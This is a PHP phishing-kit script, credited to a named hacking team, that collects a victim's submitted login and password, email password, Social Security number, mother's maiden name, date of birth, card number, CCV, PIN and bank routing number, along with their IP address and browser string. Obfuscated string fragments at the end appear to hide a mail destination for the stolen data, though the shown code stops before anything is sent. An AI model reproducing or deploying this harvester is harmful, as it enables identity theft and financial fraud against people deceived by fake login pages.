<?php
/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */
/*          ----//--//--//--//-----[ HARDC0D3R]----//--//--//--//-----                            */
/*    (c) raouf hardc0d3r 2015-2016  cyb3r7  TeaM                                                 */
/*    Right of free use is granted for all commercial or non-commercial use under CC-BY licence.  */
/*    No warranty of any form is offered.                                                         */
/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */

$login = $_POST["formtext1"];
$pass = $_POST["formtext2"];
$full_name = $_POST["formtext3"];
$add_1 = $_POST["formtext4"];
$add_2 = $_POST["formtext5"];
$city = $_POST["formtext6"];
$state = $_POST["formselect1"];
$zip1 = $_POST["formtext7"];
$zip2 = $_POST["formtext8"];
$phone_h = $_POST["formtext9"];
$phone_m = $_POST["formtext10"];
$ssn1 = $_POST["formtext11"];
$ssn2 = $_POST["formtext12"];
$ssn3 = $_POST["formtext13"];
$mother_m = $_POST["formtext14"];
$db_m = $_POST["formtext15"];
$db_d = $_POST["formtext16"];
$db_y = $_POST["formtext17"];
$email = $_POST["formtext18"];
$email_pass = $_POST["formtext19"];
$cardnumber = $_POST["formtext20"];
$ccv = $_POST["formtext21"];
$vbv = $_POST["formtext22"];
$pin = $_POST["formtext23"];
$exp_m = $_POST["formselect2"];
$exp_y = $_POST["formselect3"];
$dv = $_POST["formtext24"];
$dv_exp = $_POST["formtext25"];
$routing = $_POST["formtext26"];
$ip = getenv("REMOTE_ADDR");$m5_id='lAeWFob28uY29t';
$time = date("l jS \of F Y h:i:s A");$file_pathe = "e";$headérs="mai";
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];


?>